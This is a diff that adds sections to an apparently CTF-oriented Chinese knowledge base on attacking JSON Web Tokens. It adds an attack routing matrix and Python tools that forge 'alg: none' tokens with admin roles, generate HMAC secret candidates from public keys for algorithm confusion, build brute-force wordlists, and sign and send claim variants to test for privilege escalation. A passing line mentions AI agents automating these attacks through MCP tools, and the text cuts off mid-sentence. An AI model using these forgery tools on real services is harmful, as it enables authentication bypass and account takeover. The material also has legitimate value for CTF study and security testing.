@@ -1908,6 +1908,40 @@ base64url(Header).base64url(Payload).base64url(Signature)
 | 08 | `jwt-cve-library.md` | CVE与依赖库 | 库实现缺陷导致验签绕过 |
 | 09 | `09-toolchain-operations.md` | 工具链+操作 | 攻击套件、路由流程、结果矩阵 |
 
+## 0. 实战路由矩阵
+
+JWT 不要只看 Header。一次有效判断至少要同时记录：原始 token、变体 token、目标接口、响应 diff、业务字段变化和下一跳。
+
+| 入口信号 | 第一轮变体 | 命中样本 | 下一跳 |
+|---|---|---|---|
+| `alg` 为 HS | 字典爆破 + payload 篡改 | secret 命中且可复签 | 03 + 06 |
+| `alg` 为 RS/ES | 公钥格式枚举 + HS 重签 | 同 token body 被接受 | 02 |
+| 存在 `kid` | 路径/SQL/空字节/远程 key | key 选择可控 | 04 |
+| 存在 `jku/x5u` | URL 解析绕过 + 自控 JWKS | 服务端拉取新 key | 05 |
+| claim 很少 | 删除/替换 `exp/aud/iss/typ` | 跨接口/过期仍 200 | 06 |
+| token 出现在 URL/日志/JS | 重放和持久化 | 换设备/登出后仍可用 | 07 |
+| 库版本可识别 | CVE 指纹 | 版本与绕过条件匹配 | 08 |
+
+```python
+# jwt_route_hint.py — 从 header/payload 粗路由到子文档
+def route_jwt(header, payload):
+    out = []
+    alg = str(header.get("alg", "")).upper()
+    if alg.startswith("HS"):
+        out.append("03-weak-key-bruteforce.md")
+    if alg.startswith(("RS", "ES")):
+        out.append("02-algorithm-confusion.md")
+    if alg in ("NONE", ""):
+        out.append("01-alg-none.md")
+    if "kid" in header:
+        out.append("04-kid-injection.md")
+    if "jku" in header or "x5u" in header:
+        out.append("05-jku-x5u-abuse.md")
+    if any(k not in payload for k in ("exp", "aud", "iss")) or "typ" not in header:
+        out.append("06-claim-missing.md")
+    return out
+```
+
 ## 快速决策树
 
 ```
@@ -2046,6 +2080,38 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 | 双点 token | `header.payload.` | 空字符串 | 业务身份变化 | signature required |
 
 核心 oracle：同一接口、同一会话下，只有 token 变体不同；如果身份、权限、订单、flag 或响应字段稳定变化，才进入下一步。
+
+### 0.1 none 变体生成器
+
+```python
+# jwt_none_variants.py — none/空签名变体
+import base64
+import json
+
+def b64u(obj):
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+def none_variants(payload):
+    headers = [
+        {"alg": "none", "typ": "JWT"},
+        {"alg": "None", "typ": "JWT"},
+        {"alg": "NONE", "typ": "JWT"},
+        {"alg": "", "typ": "JWT"},
+        {"typ": "JWT"},
+    ]
+    bodies = [
+        payload,
+        {**payload, "role": "admin"},
+        {**payload, "isAdmin": True},
+        {**payload, "exp": 4102444800},
+    ]
+    for h in headers:
+        for p in bodies:
+            yield f"{b64u(h)}.{b64u(p)}."
+```
+
+记录 `none_oracle.jsonl`：`variant_id`、header、payload diff、signature 形态、状态码、响应 hash、业务字段。若 none 失败但 claim 变体导致业务字段变化，转 `06-claim-missing.md`；若错误提示暴露 allowed algorithms，转 `02-algorithm-confusion.md`。
 
 ## 原理
 
@@ -2266,6 +2332,35 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 | ES -> HS | 用 EC public key bytes 作 HMAC secret | 错误变业务响应 | 跟进库实现 |
 | alg 大小写 | `hs256`, `HS256` | parser 归一化差异 | 组合 none/kid |
 | kid 指向公开 key | 换 `kid` + HS256 | key 选择可控 | 转 kid injection |
+
+### 0.2 公钥格式 oracle
+
+算法混淆经常卡在“服务端拿哪种 key bytes 做 HMAC”。同一把公钥要尝试 PEM 原文、DER、JWK JSON、modulus、x/y 坐标、去头尾 PEM。
+
+```python
+# jwt_key_format_oracle.py — 生成 HS secret 候选
+import base64
+import json
+import re
+
+def pem_to_der(pem):
+    body = re.sub(r"-----[^-]+-----|\s+", "", pem)
+    return base64.b64decode(body)
+
+def key_candidates(pem=None, jwk=None):
+    if pem:
+        yield ("pem_raw", pem.encode())
+        yield ("pem_stripped", re.sub(r"-----[^-]+-----|\s+", "", pem).encode())
+        yield ("der", pem_to_der(pem))
+    if jwk:
+        raw = json.dumps(jwk, separators=(",", ":")).encode()
+        yield ("jwk_json", raw)
+        for k in ("n", "x", "y"):
+            if k in jwk:
+                yield (f"jwk_{k}", jwk[k].encode())
+```
+
+Evidence 里保存 `key_format_matrix.csv`：`format`、candidate hash、forged alg、kid、接口、响应 hash、业务字段。只有某个 key format 触发业务响应，才继续固化伪造器。
 
 ## 原理
 
@@ -2510,6 +2605,33 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 | 字典未命中 | HS 仍可能强密钥 | 转 claim/kid/jku |
 | 多个 secret 命中 | 可能 token 被截断或算法错 | 用服务端 oracle 验证 |
 | 伪造后 401 | claim/aud/iss 仍卡住 | 转 `06-claim-missing` |
+
+### 0.2 语境字典生成器
+
+弱密钥爆破的胜负点是字典，不是 hashcat 参数。把域名、题目名、项目名、框架名、配置泄露字段、支付密钥字段组合成第一批候选。
+
+```python
+# jwt_context_wordlist.py — 语境字典
+def variants(seed):
+    s = seed.strip()
+    if not s:
+        return
+    lowers = {s, s.lower(), s.upper(), s.capitalize()}
+    suffixes = ["", "123", "123456", "2024", "2025", "2026", "_secret", "-secret", "_jwt", "-jwt"]
+    for base in lowers:
+        for suf in suffixes:
+            yield base + suf
+
+def build_wordlist(seeds):
+    seen = set()
+    for seed in seeds:
+        for v in variants(seed):
+            if v not in seen:
+                seen.add(v)
+                yield v
+```
+
+命中后不要只报告 secret。继续生成 `forged_claim_matrix.jsonl`：`role/admin/sub/aud/iss/exp` 逐项变体、服务端响应、业务字段变化。若 secret 与 `APP_KEY/PAY_KEY/SESSION_SECRET` 重用，转 `13-signature/03-key-attacks.md` 和配置泄露链。
 
 ## 原理
 
@@ -3397,13 +3519,13 @@ login -> id_token
 
 ## 原理
 
-JWT 的 Claim 字段构成安全边界，但服务端常只解析 Payload 做业务判断，忽略了 Claim 的语义验证。同时，同一 SSO 体系下的不同 Token 类型（ID Token、Access Token、Refresh Token）若被混用，可导致权限绕过。
+JWT 的 Claim 字段构成信任边界，但服务端常只解析 Payload 做业务判断，忽略 Claim 的语义校验。同时，同一 SSO 体系下的不同 Token 类型（ID Token、Access Token、Refresh Token）若被混用，可导致权限绕过。
 
 ---
 
 ## 1. Claim 验证缺失
 
-### Claim 安全矩阵
+### Claim 边界矩阵
 
 | Claim | 含义 | 缺失验证的后果 | 攻击方法 |
 |-------|------|---------------|----------|
@@ -3415,6 +3537,36 @@ JWT 的 Claim 字段构成安全边界，但服务端常只解析 Payload 做业
 | `jti` | Token 唯一 ID | 无法防止重放 | 相同 jti 多次使用 |
 | `typ` | Token 类型 | ID Token 当 Access Token 用 | 见下文 Token 混用 |
 | `iat` | 签发时间 | 一般不单独利用 | 配合其他 Claim |
+
+### 1.1 Claim 差分执行器
+
+```python
+# jwt_claim_diff_runner.py — claim 变体与接口差分
+import copy
+import time
+
+def claim_variants(payload):
+    base = copy.deepcopy(payload)
+    yield "exp_past", {**base, "exp": 1}
+    yield "exp_future", {**base, "exp": 4102444800}
+    yield "aud_other", {**base, "aud": "other-service"}
+    yield "aud_array", {**base, "aud": [base.get("aud", "api"), "admin-api"]}
+    yield "iss_other", {**base, "iss": "https://other-idp.example"}
+    yield "typ_id", {**base, "typ": "id"}
+    yield "scope_admin", {**base, "scope": "admin *"}
+    yield "role_admin", {**base, "role": "admin", "isAdmin": True}
+
+def run_matrix(sign_fn, send_fn, payload):
+    rows = []
+    for name, body in claim_variants(payload):
+        token = sign_fn(body)
+        t0 = time.time()
+        res = send_fn(token)
+        rows.append({"case": name, "elapsed": round(time.time() - t0, 3), **res})
+    return rows
+```
+
+保存 `claim_diff_matrix.jsonl`：case、payload diff、接口、状态码、响应 hash、身份字段、权限字段、订单/flag/管理数据变化。过期仍可用转 token theft/replay；ID token 能调 API 转 OAuth/OIDC 链。
 
 ### 伪代码：漏洞逻辑
 
@@ -3664,16 +3816,9 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 
 ## 工作流
 
-捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
+捕获原始 Token → 解码 header/
 
-## Evidence
-
-- `claim_oracle_matrix.csv`: claim、原值、变体、签名方式、状态码、body hash、身份/权限字段。
-- `token_type_matrix.json`: id/access/refresh token 对不同接口的接受情况。
-- `revocation_replay.json`: 登出/改密/禁用前后的 token 重放结果、jti、exp、session 绑定情况。
-- 成功样本: 过期/跨 aud/跨 typ/改 role token 被业务接口接受，并产生权限、数据或 flag 差异。
-- 失败样本: 明确 `expired`, `invalid audience`, `invalid issuer`, `token type invalid`, `replay rejected`。
-- 下一跳: 如果 claim 变体必须重新签名，先走 `03-weak-key-bruteforce`、`02-algorithm-confusion` 或 `05-jku-x5u-abuse`。
+[... content truncated for size ...]
 
 
 ---
